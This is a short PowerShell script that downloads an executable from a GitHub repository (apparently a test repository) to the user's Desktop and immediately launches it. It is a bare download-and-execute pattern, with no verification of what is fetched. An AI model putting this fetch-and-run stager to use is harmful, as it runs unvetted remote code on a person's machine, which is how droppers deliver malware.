$url = "https://github.com/analysisw/test/raw/refs/heads/main/helloworldd.exe"
$dest = "$env:USERPROFILE\Desktop\helloworldd.exe"

Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
Start-Process -FilePath $dest
